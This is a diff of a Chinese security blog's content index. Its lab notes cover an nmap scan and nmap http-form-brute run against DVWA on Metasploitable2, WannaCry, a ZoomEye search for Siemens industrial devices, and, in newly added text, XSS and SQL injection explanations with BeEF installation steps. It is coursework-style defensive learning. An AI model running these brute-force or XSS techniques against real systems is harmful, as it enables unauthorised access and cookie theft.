+<h2 id="1x01-NMAP扫描Metasploitable2端口开放情况"><a class="header-anchor" href="#1x01-NMAP扫描Metasploitable2端口开放情况">¶</a>1x01 NMAP扫描Metasploitable2端口开放情况</h2>
 <p>首先我们需要两个虚拟机设备，并让两台设备置于同一网段</p>
 <p><img src="https://img-blog.csdnimg.cn/20201028201658341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 <img src="https://img-blog.csdnimg.cn/20201028201747893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
@@ -182,14 +313,14 @@ Android 获取方法：Android： 拨号<code>*#*#4636#*#*</code>进入手机信
 </tr>
 </tbody>
 </table>
-<h2 id="1x02-nmap扫描metasploitable2操作系统类型"><a class="header-anchor" href="#1x02-nmap扫描metasploitable2操作系统类型">¶</a>1x02 NMAP扫描Metasploitable2操作系统类型</h2>
+<h2 id="1x02-NMAP扫描Metasploitable2操作系统类型"><a class="header-anchor" href="#1x02-NMAP扫描Metasploitable2操作系统类型">¶</a>1x02 NMAP扫描Metasploitable2操作系统类型</h2>
 <p>使用<code> nmap -O IP</code>即可扫描操作系统信息。扫描结果如下图<br>
 <img src="https://img-blog.csdnimg.cn/20201028204947169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x03-nmap穷举metasploitable2上dvwa的登陆账号和密码"><a class="header-anchor" href="#1x03-nmap穷举metasploitable2上dvwa的登陆账号和密码">¶</a>1x03 NMAP穷举Metasploitable2上DVWA的登陆账号和密码</h2>
+<h2 id="1x03-NMAP穷举Metasploitable2上DVWA的登陆账号和密码"><a class="header-anchor" href="#1x03-NMAP穷举Metasploitable2上DVWA的登陆账号和密码">¶</a>1x03 NMAP穷举Metasploitable2上DVWA的登陆账号和密码</h2>
 <p>通过扫描我们可以知道Metasploitable2开放了80的端口，DVWA是网页服务器而且上面也没有开启443端口所有就肯定在80端口了。</p>
 <p>接下来选择nmap自带的http暴力破解工具 <code>http-form-brute</code> 选择路径为：<code>/dvwa/login.php</code> 组成的命令为：<br>
 <code>nmap -p 80 -script=http-form-brute -script-args=http-form-brute.path=/dvwa/login.php 10.34.80.4</code></p>
-<h2 id="1x04-永恒之蓝-wannacry蠕虫"><a class="header-anchor" href="#1x04-永恒之蓝-wannacry蠕虫">¶</a>1x04 永恒之蓝-WannaCry蠕虫</h2>
+<h2 id="1x04-永恒之蓝-WannaCry蠕虫"><a class="header-anchor" href="#1x04-永恒之蓝-WannaCry蠕虫">¶</a>1x04 永恒之蓝-WannaCry蠕虫</h2>
 <p>WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件。蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。此病毒通过远程高危漏洞进行自我传播复制,并且加密文件采用了高强度的双RSA+AES加密,至少目前来说破解秘钥是不可能的,只能通过预防的方式来防御,勤打补丁,关闭445、139等端口,及时安装安全软件。</p>
 <h1>0x05 ZoomEye搜索一个西门子工控设备</h1>
 <p>在ZoomEye中搜索西门子工控设备，点击一个可以看到该IP设备的如下信息</p>
@@ -205,7 +336,7 @@ Android 获取方法：Android： 拨号<code>*#*#4636#*#*</code>进入手机信
 <h2 id="1x02-笑脸后的阴霾"><a class="header-anchor" href="#1x02-笑脸后的阴霾">¶</a>1x02 笑脸后的阴霾</h2>
 <p>用16进制查看器拿到最后可以发现：tom is the killer. 太可怕了～～<br>
 <img src="https://img-blog.csdnimg.cn/20201028213359949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x04-使用数据恢复软件恢复u盘文件"><a class="header-anchor" href="#1x04-使用数据恢复软件恢复u盘文件">¶</a>1x04 使用数据恢复软件恢复U盘文件</h2>
+<h2 id="1x04-使用数据恢复软件恢复U盘文件"><a class="header-anchor" href="#1x04-使用数据恢复软件恢复U盘文件">¶</a>1x04 使用数据恢复软件恢复U盘文件</h2>
 <p>目前网络中的U盘数据工具很多，我使用了一个叫做嗨格式的U盘恢复软件，效果还挺不错的，操作也很简单。</p>
 <p><img src="https://img-blog.csdnimg.cn/20201028214625398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h1>0x07 小结</h1>
@@ -226,134 +357,161 @@ Android 获取方法：Android： 拨号<code>*#*#4636#*#*</code>进入手机信
       </tags>
   </entry>
   <entry>
-    <title>空间金字塔池化网络SPP-Net</title>
-    <url>/2020/10/29/%E7%A9%BA%E9%97%B4%E9%87%91%E5%AD%97%E5%A1%94%E6%B1%A0%E5%8C%96%E7%BD%91%E7%BB%9CSPP-Net/</url>
-    <content><![CDATA[<p>@[toc]</p>
-<h2 id="0x01概要介绍"><a class="header-anchor" href="#0x01概要介绍">¶</a>0x01概要介绍</h2>
-<p>现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。</p>
-<a id="more"></a>
-<p><code>SPP-net使用单一的完整图像表示而不是精细的方法实现了最先进的分类结果-调音SPP网络的强大功能在目标检测中也很重要。利用SPP网络，我们只需计算一次来自整个图像的特征映射，然后将任意区域（子图像）的特征集合起来生成固定长度的表示，以训练检测器</code>。该方法避免了重复计算卷积特征。在处理测试图像时，我们的方法比R-CNN方法快24-102倍</p>
-<p><code>引出SPP-Net的原因：</code><br>
-在cnn的训练和测试中存在一个技术问题：目前流行的CNNs要求输入图像大小固定（如224×224），这既限制了输入的纵横比，也限制了输入的规模图像。什么时候对于任意大小的图像，当前的方法大多是将输入图像调整为固定大小，通过裁剪或通过翘曲，如图所示。但是裁剪区域可能不包含整个对象，而扭曲的内容可能会导致不需要的几何图形扭曲。识别由于内容丢失或失真，精度可能会受到影响。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201029202219733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-<code>为什么需要固定尺寸？</code></p>
-<p>cnn主要由两部分组成：卷积层和随后的完全连接层。卷积层以滑动窗口方式操作，并输出表示激活的空间排列的特征图（图2）。事实上，旋转层不需要固定的图像大小，可以生成任何尺寸的特征图。另一方面，完全连接的层需要有固定大小/长度的定义输入。因此，固定大小约束仅来自完全连接层.</p>
-<p>输入本文引入空间金字塔池（SPP）来取消网络固定规模约束</p>
-<h2 id="0x02-spp-net"><a class="header-anchor" href="#0x02-spp-net">¶</a>0x02 SPP-Net</h2>
-<p>我添加了最后一个卷积层上的SPP层。spp层将特征集合起来，生成固定长度的输出，然后输入到完全连接的层（或其他分类器）。换句话说，我们在网络层次结构的高级阶段（在进化层和完全连接层之间）执行一些信息“聚合”，以避免在开始。图1（底部）通过引入SPP层显示了网络体系结构的变化。我们称之为新的网络结构spp-net</p>
-<p><code>SPP的优点</code></p>
-<p>SPP对于深层CNN有几个显著的特性：1）SPP能够生成固定长度的输出，而不考虑输入大小，而以前的deepnetworks中使用的滑动窗口池[3]不能；2）SPP使用多级而滑动窗口池只使用单个窗口大小。多层池对物体变形具有很强的鲁棒性[15]；3）由于输入尺度的灵活性，在可变尺度下提取的SPPcan池特征。实验表明，这些因素都提高了深层网络的识别精度。</p>
-<p>SPP-net不仅可以从任意大小的图像/窗口生成测试的表示，而且还允许我们在训练期间提供不同大小或比例的图像。使用可变大小的图像进行训练可以提高尺度不变性并减少过拟合。我们开发了一种简单的多尺寸采集方法。当我们接受一个网络输入的单一变量时，我们使用一个固定的网络大小来训练它。在每一个纪元中，我们用一个给定的输入大小训练网络，然后切换到另一个输入大小来进行下一步操作。实验表明，这种多尺度训练与传统的单尺度训练一样收敛，具有更好的测试精度。</p>
-<p><code>与R-CNN对对比：</code></p>
-<p>R-CNN中的特征计算是非常耗时的，因为它反复地将深度卷积网络应用于每幅图像上数千个扭曲区域的原始像素。Spp-Net可以在整个图像上运行卷积层（不考虑窗口数），然后通过SPP网络在特征地图上提取特征。注意 <strong>在特征地图（而不是图像区域）上训练/运行探测器实际上是一个更流行的想法。</strong> 但SPP网络继承了CNN深层特征映射的强大功能，同时也继承了SPP在任意窗口大小下的灵活性，从而使SPP网络具有了卓越的精度和效率。在我们的实验中，基于SPP网络的系统（建立在CNN管道上）计算的特征比R-CNN快24-102倍，具有更好的或可比性准确。有SPP网络可以促进更深层和更大的各种网络.</p>
-<h2 id="0x03-网络结构"><a class="header-anchor" href="#0x03-网络结构">¶</a>0x03 网络结构</h2>
-<h3 id="1x01-卷积层和特征图"><a class="header-anchor" href="#1x01-卷积层和特征图">¶</a>1x01 卷积层和特征图</h3>
-<p>考虑一下流行的七层架构，前五层是卷积的，其中一些是池层。这些池层也可以被认为是“卷积的”，因为它们使用的是滑动窗口。</p>
-<p>最后的两层是完全连接的，以N路softmax作为输出，其中N是类别的数目。</p>
-<p>上面描述的深度网络需要一个fixedimage大小。然而，我们注意到，固定尺寸的要求仅仅是由于完全连接的层需要固定长度向量作为输入。另一方面，卷积层接受轨道尺寸的输入。卷积层使用滑动过滤器，其输出与输入的aspectratio大致相同。这些输出被称为特征映射[1]——它们不仅涉及到响应的强度，而且涉及到它们的空间位置。</p>
-<p>将一些特征地图可视化。它们是由conv5layer的一些过滤器生成的。图2（c）显示了ImageNet数据集中这些过滤器的最强激活图像。我们看到过滤器可以被一些语义内容激活。例如，第55个滤波器（图2，左下角）最易被圆形激活；第66个滤波器（图2，右上角）最易被∧形激活；第118个滤波器（图2，右下角）最易被a∨激活-形状。这些输入图像中的形状（图2（a））激活相应位置的特征映射（图2中的箭头）</p>
-<p><img src="https://img-blog.csdnimg.cn/20201029202425874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>生成图2中的featuremaps，而不需要固定输入大小。这些由深卷积层生成的特征映射与传统方法中的特征映射相似[27]，[28]。在这些方法中，SIFT向量[29]或图像块[28]被密集地提取和编码，例如通过矢量量化、稀疏编码或费希尔核进行编码。这些编码的特征由特征映射组成，然后由词包（BoW）或空间金字塔集合。类似地，深卷积特征可以以类似的方式汇集在一起。</p>
-<h3 id="1x02-空间金字塔池层"><a class="header-anchor" href="#1x02-空间金字塔池层">¶</a>1x02 空间金字塔池层</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201029202443152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>这样的向量可以通过单词包（BoW）方法生成，该方法将这些特征集合在一起。空间金字塔池[14]，[15]改进了BoW，因为它可以通过在局部空间容器中的池来保持空间信息。这些空间存储单元的大小与图像大小成比例，因此无论图像大小，存储单元的数量都是固定的。这与以前的深层网络的滑动窗口池[3]不同，其中滑动窗口的数量取决于输入大小。到对于任意大小的图像采用深网络，我们将最后一个池层（例如，在最后一个卷积层之后的pool5）替换为aspatialpyramd池层。图3说明了方法。输入每一个空间单元，我们将每个滤波器的响应集中起来（在本文中我们使用最大池），空间金字塔池的输出是km维向量，其中格数表示为sm（kis是最后一个卷积层中的滤波器数）。固定维向量被输入到全连通层。</p>
-<h2 id="0x04-训练网络"><a class="header-anchor" href="#0x04-训练网络">¶</a>0x04 训练网络</h2>
-<p>Spp-Net的训练过程分为两部</p>
-<h3 id="1x01-单一尺度训练-single-size"><a class="header-anchor" href="#1x01-单一尺度训练-single-size">¶</a>1x01 单一尺度训练——single-size</h3>
-<p>所谓单一尺寸训练指的是先只对一种固定输入图像进行训练，比如224 x 224，在conv5之后的特征图为：13x13这就是我们的（a x a）而我要得到的输出为4 x 4，2 x 2,1 x 1，怎么办呢？这里金字塔层bins即为 n x n，也就是4 x 4，2 x 2,1 x 1，我们要做的就是如何根据a和n设计一个池化层，使得a x a的输入能够得到n x n的输出。实际上这个池化层很好设计，我们称这个大小和步幅会变化的池化层为sliding window pooling。</p>
-<p>它的大小为：windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整。数据实验如下：</p>
-<p>当a x a为13 x 13时，要得到4 x 4的输出，池化层的大小为4，移动步幅为3；</p>
-<p>当a x a为13 x 13时，要得到2 x 2的输出，池化层的大小为7，移动步幅为6；</p>
-<p>当a x a为13 x 13时，要得到1 x 1的输出，池化层的大小为13，移动步幅为13；</p>
-<p>有的小伙伴一定发现，那如果我的输入a x a变化为10 x 10呢，此时再用上面的三个池化核好像得不到固定的理想输出啊，事实上的确如此，这是训练的第二个过程要讲的，因为此过程称之为“单一尺度训练”，针对的就是某一个固定的输入尺度而言的。</p>
-<h2 id="1x02-多尺寸训练-multi-size-以两种尺度为例"><a class="header-anchor" href="#1x02-多尺寸训练-multi-size-以两种尺度为例">¶</a>1x02 多尺寸训练——multi-size（以两种尺度为例）</h2>
-<p>虽然带有SPP（空间金字塔）的网络可以应用于任意尺寸，为了解决不同图像尺寸的训练问题，我们往往还是会考虑一些预设好的尺寸，而不是一些尺寸种类太多，毫无章法的输入尺寸。现在考虑这两个尺寸：180×180,224×224，此处只考虑这两个。</p>
-<p>我们使用<code>缩放</code>而不是裁剪，将前述的224的区域图像变成180大小。这样，不同尺度的区域仅仅是分辨率上的不同，而不是内容和布局上的不同。</p>
-<p>那么对于接受180输入的网络，我们实现另一个固定尺寸的网络。在论文中，conv5输出的特征图尺寸是axa=10×10。我们仍然使用windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整，实现每个金字塔池化层。这个180网络的空间金字塔层的输出的大小就和224网络的一样了。</p>
-<p>当a x a为10 x 10时，要得到4 x 4的输出，池化层的大小为3，移动步幅为2（注意：此处根据这样的一个池化层，10 x 10的输入好像并得不到4 x 4的输出，9 x 9或者是11 x 11的倒可以得到4 x 4的）这个地方我也还不是特别清楚这个点，后面我会说出我的个人理解。</p>
-<p>当a x a为10 x 10时，要得到2 x 2的输出，池化层的大小为5，移动步幅为5；</p>
-<p>当a x a为10 x 10时，要得到1 x 1的输出，池化层的大小为10，移动步幅为10；</p>
-<p>这样，这个180网络就和224网络拥有一样的参数了。换句话说，训练过程中，我们通过使用共享参数的两个固定尺寸的网络实现了不同输入尺寸的SPP-net。</p>
-<p>为了降低从一个网络（比如224）向另一个网络（比如180）切换的开销，我们在每个网络上训练一个完整的epoch，然后在下一个完成的epoch再切换到另一个网络（权重保留）。依此往复。实验中我们发现多尺寸训练的收敛速度和单尺寸差不多。</p>
-<p>多尺寸训练的主要目的是在保证已经充分利用现在被较好优化的固定尺寸网络实现的同时，模拟不同的输入尺寸。除了上述两个尺度的实现，我们也在每个epoch中测试了不同的s x s输入，s是从180到224之间均匀选取的。后面将在实验部分报告这些测试的结果。</p>
-<p>注意，上面的单尺寸或多尺寸解析度只用于训练。在测试阶段，是直接对各种尺寸的图像应用SPP-net的。</p>
-<h2 id="0x05-spp-net在目标检测上的应用"><a class="header-anchor" href="#0x05-spp-net在目标检测上的应用">¶</a>0x05 Spp-Net在目标检测上的应用</h2>
-<p>SPP网络，这个方法的思想在R-CNN、Fast RCNN， Faster RCNN上都起了举足轻重的作用，对于检测算法，论文中是这样做到：使用ss生成~2k个候选框，缩放图像min(w,h)=s之后提取特征，每个候选框使用一个4层的空间金字塔池化特征，网络使用的是ZF-5的SPPNet形式。之后将12800d的特征输入全连接层，SVM的输入为全连接层的输出。这个算法可以应用到多尺度的特征提取：先将图片resize到五个尺度：480，576，688，864，1200，加自己6个。然后在map window to feature map一步中，选择ROI框尺度在｛6个尺度｝中大小最接近224x224的那个尺度下的feature maps中提取对应的roi feature。这样做可以提高系统的准确率。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201029204259321.png" alt="在这里插入图片描述"></p>
+    <title>【白帽子学习笔记】XSS和SQL注入</title>
+    <url>/2020/11/17/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1>【白帽子学习笔记】XSS和SQL注入</h1>
+<table>
+<thead>
+<tr>
+<th>yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<p>@[toc]</p>
+<h2 id="0x01-实验知识点"><a class="header-anchor" href="#0x01-实验知识点">¶</a>0x01 实验知识点</h2>
+<h3 id="1x01-什么是XSS？"><a class="header-anchor" href="#1x01-什么是XSS？">¶</a>1x01 什么是XSS？</h3>
+<p>XSS又叫CSS (Cross Site Script) 也称为跨站，它是指<strong>攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</strong></p>
+<p><strong>XSS攻击</strong>是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。</p>
+<h3 id="1x02-什么是Cookie？"><a class="header-anchor" href="#1x02-什么是Cookie？">¶</a>1x02 什么是Cookie？</h3>
+<p>Cookie，有时也用其复数形式Cookies，指某些网站<strong>为了辨别用户身份</strong>、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。<br>
+Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。</p>
+<h3 id="1x03-XSS漏洞的分类"><a class="header-anchor" href="#1x03-XSS漏洞的分类">¶</a>1x03 XSS漏洞的分类</h3>
+<p><strong>存储型 XSS</strong>：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。<br>
+如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个<strong>定时炸弹</strong>放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。<br>
+存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。</p>
+<p><strong>DOM-Based XSS漏洞</strong>：	DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（<a href="http://www.w.org.DOM/%EF%BC%89,DOM%E6%98%AF%E4%B8%80%E7%A7%8D%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%81%E5%B9%B3%E5%8F%B0%E3%80%81%E8%AF%AD%E8%A8%80%E6%97%A0%E5%85%B3%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BD%BF%E5%BE%97%E7%BD%91%E9%A1%B5%E5%BC%80%E5%8F%91%E8%80%85%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%AE%83%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2%E5%85%B6%E4%BB%96%E7%9A%84%E6%A0%87%E5%87%86%E7%BB%84%E4%BB%B6%E3%80%82%E7%AE%80%E5%8D%95%E8%A7%A3%E9%87%8A%EF%BC%8CDOM%E8%A7%A3%E5%86%B3%E4%BA%86Netscape%E7%9A%84JavaScript%E5%92%8CMicrosoft%E7%9A%84JScrtipt%E4%B9%8B%E9%97%B4%E7%9A%84%E5%86%B2%E7%AA%81%EF%BC%8C%E7%BB%99%E4%BA%88Web%E8%AE%BE%E8%AE%A1%E5%B8%88%E5%92%8C%E5%BC%80%E5%8F%91%E8%80%85%E4%B8%80%E4%B8%AA%E6%A0%87%E5%87%86%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E8%AE%A9%E4%BB%96%E4%BB%AC%E6%9D%A5%E8%AE%BF%E9%97%AE%E4%BB%96%E4%BB%AC%E7%AB%99%E7%82%B9%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%81%E8%84%9A%E6%9C%AC%E5%92%8C%E8%A1%A8%E7%8E%B0%E5%B1%82%E5%AF%B9%E8%B1%A1%E3%80%82">http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。</a><br>
+由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。</p>
+<p>**反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。</p>
+<p>关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下</p>
+<p><a href="https://blog.csdn.net/python_LC_nohtyp/article/details/106731406">【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击）</a></p>
+<h3 id="1x04-SQL注入攻击"><a class="header-anchor" href="#1x04-SQL注入攻击">¶</a>1x04 SQL注入攻击</h3>
+<p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。<br>
+<strong>为什么会有SQL注入攻击？</strong><br>
+很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。<br>
+因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。</p>
+<p>关于SQL注入的常用语法我也有进行整理，链接如下：<br>
+<a href="https://blog.csdn.net/python_LC_nohtyp/article/details/106862663">【白帽子学习笔记14】SQL注入常用语句</a><br>
+<a href="https://blog.csdn.net/python_LC_nohtyp/article/details/107589604">【白帽子学习笔记15】XVWA SQL Injection</a></p>
+<h2 id="0x02-XSS部分：Beef"><a class="header-anchor" href="#0x02-XSS部分：Beef">¶</a>0x02 XSS部分：Beef</h2>
+<h3 id="1x01-搭建GuestBook网站"><a class="header-anchor" href="#1x01-搭建GuestBook网站">¶</a>1x01 搭建GuestBook网站</h3>
+<p>本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点</p>
+<ul>
+<li>在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。</li>
+<li>如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网站。</li>
+<li>本次实验中虚拟机网络模式：Net模式</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20201117121506193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="1x02-AWVS扫描"><a class="header-anchor" href="#1x02-AWVS扫描">¶</a>1x02 AWVS扫描</h3>
+<p>首先我们使用AWVS扫描刚才搭建的网站</p>
+<p><img src="https://img-blog.csdnimg.cn/2020111712280017.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/20201117122818910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/20201117122851886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下：<br>
+<img src="https://img-blog.csdnimg.cn/2020111712402383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/20201117124044245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+发现在error.asp和add.asp分别都有一个XSS漏洞。</p>
+<h3 id="1x03-Kail中使用Beef生成恶意代码"><a class="header-anchor" href="#1x03-Kail中使用Beef生成恶意代码">¶</a>1x03 Kail中使用Beef生成恶意代码</h3>
+<p>现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下<br>
+<code>sudo apt-get install beef-xss</code><br>
+然后cd进入到这个文件夹中：<br>
+<code>cd /usr/share/beef-xss </code><br>
+输入：<br>
+<code>./beef</code>即可启动<br>
+第一次的时候可能会提醒你不要使用默认的账号和密码，就像下面这样：<br>
+<img src="https://img-blog.csdnimg.cn/20201117130054881.png#pic_center" alt="在这里插入图片描述"><br>
+我们进入到提示的文件夹中进行一下修改<br>
+用vim打开一下：<code>sudo vim /etc/beef-xss/config.yaml</code><br>
+不会使用vim的建议百度搜索一下用法，linux下经常会用到。<br>
